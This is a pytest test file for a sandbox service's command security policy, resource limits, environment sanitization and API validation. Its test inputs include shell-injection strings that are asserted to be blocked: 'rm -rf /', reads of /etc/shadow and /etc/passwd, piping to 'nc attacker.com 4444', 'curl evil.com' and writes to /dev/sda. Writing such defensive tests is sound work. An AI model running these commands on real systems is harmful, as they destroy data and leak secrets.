import os
import shutil
import tempfile
import pytest
from fastapi.testclient import TestClient

from apps.api.main import app
from sandbox.policies.command_policy import CommandSecurityPolicy
from sandbox.resource_limits.limits import ResourceLimits
from sandbox.runner.container_runner import DockerContainerRunner
from sandbox.runner.executor import SandboxExecutor

client = TestClient(app)


def test_command_security_policy_shell_injection_blocking():
    policy = CommandSecurityPolicy()

    # 1. Chaining operators must be rejected
    assert policy.is_command_allowed("npm test; rm -rf /")[0] is False
    assert policy.is_command_allowed("npm test && whoami")[0] is False
    assert policy.is_command_allowed("npm test || cat /etc/shadow")[0] is False
    assert policy.is_command_allowed("npm test | nc attacker.com 4444")[0] is False
    assert policy.is_command_allowed("npm test & curl evil.com")[0] is False

    # 2. Subshell & backtick execution must be rejected
    assert policy.is_command_allowed("npm test $(whoami)")[0] is False
    assert policy.is_command_allowed("npm test `id`")[0] is False

    # 3. Multiline newline splitting must be rejected
    assert policy.is_command_allowed("npm test\ncat /etc/passwd")[0] is False
    assert policy.is_command_allowed("npm test\rrm -rf .")[0] is False

    # 4. Redirect operators must be rejected
    assert policy.is_command_allowed("npm test > /dev/sda")[0] is False
    assert policy.is_command_allowed("npm test < /etc/shadow")[0] is False

    # 5. Path traversal in arguments must be rejected
    assert policy.is_command_allowed("pytest ../../../etc/passwd")[0] is False

    # 6. Null byte injection must be rejected
    assert policy.is_command_allowed("npm test\0evil")[0] is False

    # 7. Oversized command (>500 chars) must be rejected
    assert policy.is_command_allowed("npm test " + "a" * 600)[0] is False

    # 8. Legitimate allowed commands must pass
    assert policy.is_command_allowed("npm test")[0] is True
    assert policy.is_command_allowed("pytest tests/")[0] is True
    assert policy.is_command_allowed("git status")[0] is True


def test_resource_limits_boundary_clamping():
    # Clamping CPU, timeout, and pids limits
    limits_low = ResourceLimits(cpu_limit=0.01, execution_timeout=0, pids_limit=2)
    assert limits_low.cpu_limit == 0.1
    assert limits_low.execution_timeout == 1
    assert limits_low.pids_limit == 16

    limits_high = ResourceLimits(cpu_limit=100.0, execution_timeout=9999, pids_limit=9999)
    assert limits_high.cpu_limit == 8.0
    assert limits_high.execution_timeout == 300
    assert limits_high.pids_limit == 512


def test_container_runner_environment_sanitization():
    temp_dir = tempfile.mkdtemp()
    try:
        # Simulate environment with secrets
        os.environ["SUPER_SECRET_TOKEN"] = "token_12345_sensitive"
        os.environ["GITHUB_TOKEN"] = "ghp_abcdef1234567890"
        os.environ["DATABASE_URL"] = "postgres://admin:password@localhost/db"

        runner = DockerContainerRunner(temp_dir)
        sanitized_env = runner._get_sanitized_environment()

        # Sensitive variables must be completely stripped
        assert "SUPER_SECRET_TOKEN" not in sanitized_env
        assert "GITHUB_TOKEN" not in sanitized_env
        assert "DATABASE_URL" not in sanitized_env

        # Safe defaults must exist
        assert sanitized_env["CI"] == "true"
        assert sanitized_env["NODE_ENV"] == "test"

    finally:
        os.environ.pop("SUPER_SECRET_TOKEN", None)
        os.environ.pop("GITHUB_TOKEN", None)
        os.environ.pop("DATABASE_URL", None)
        shutil.rmtree(temp_dir)


def test_sandbox_executor_policy_enforcement():
    temp_dir = tempfile.mkdtemp()
    try:
        executor = SandboxExecutor(temp_dir)

        # Executing command with injection operator returns security violation
        res_violation = executor.execute("npm test && evil_command")
        assert res_violation["status"] == "security_violation"
        assert res_violation["exit_code"] == 126
        assert "Security Violation" in res_violation["stderr"]

        # Executing unauthorized command returns blocked status
        res_denied = executor.execute("nc -l 8080")
        assert res_denied["status"] == "security_violation"
        assert res_denied["exit_code"] == 126

    finally:
        shutil.rmtree(temp_dir)


def test_sandbox_api_endpoints_validation():
    # 1. /api/sandbox/execute with empty command should fail
    res_empty = client.post("/api/sandbox/execute", json={"command": ""})
    assert res_empty.status_code == 400
    assert "cannot be empty" in res_empty.json()["detail"]

    # 2. /api/sandbox/execute with oversized command (>500 chars) should fail
    res_oversized = client.post("/api/sandbox/execute", json={"command": "npm test " + "x" * 600})
    assert res_oversized.status_code == 400
    assert "exceeds maximum length" in res_oversized.json()["detail"]

    # 3. /api/sandbox/execute with invalid directory should fail
    res_bad_dir = client.post("/api/sandbox/execute", json={
        "command": "npm test",
        "directory_path": "/invalid/non_existent_folder_xyz"
    })
    assert res_bad_dir.status_code == 400

    # 4. /api/sandbox/status with invalid directory should fail
    res_status_bad = client.get("/api/sandbox/status?directory_path=/invalid/path/xyz")
    assert res_status_bad.status_code == 400

    # 5. /api/sandbox/status valid call
    res_status = client.get("/api/sandbox/status")
    assert res_status.status_code == 200
    data = res_status.json()
    assert "policy" in data
    assert data["policy"]["shell_injection_guards_active"] is True
